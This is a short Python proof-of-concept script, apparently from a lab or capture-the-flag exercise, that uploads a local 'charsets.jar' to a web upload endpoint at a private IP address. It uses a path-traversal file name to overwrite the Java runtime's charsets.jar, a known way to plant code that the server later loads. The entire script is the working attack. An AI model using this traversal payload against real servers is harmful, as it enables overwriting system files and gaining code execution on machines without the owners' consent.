import requests

url = "http://192.168.239.139:8081/upload"
#proxy = {'http': 'http://127.0.0.1:8080'}

target_path = "../../usr/lib/jvm/jdk1.8.0_201/jre/lib/charsets.jar"

with open(r"charsets.jar", "rb") as f:
    files = {
        'file': (target_path, f, 'application/octet-stream')
    }
    response = requests.post(url, files=files)

print(response.text)
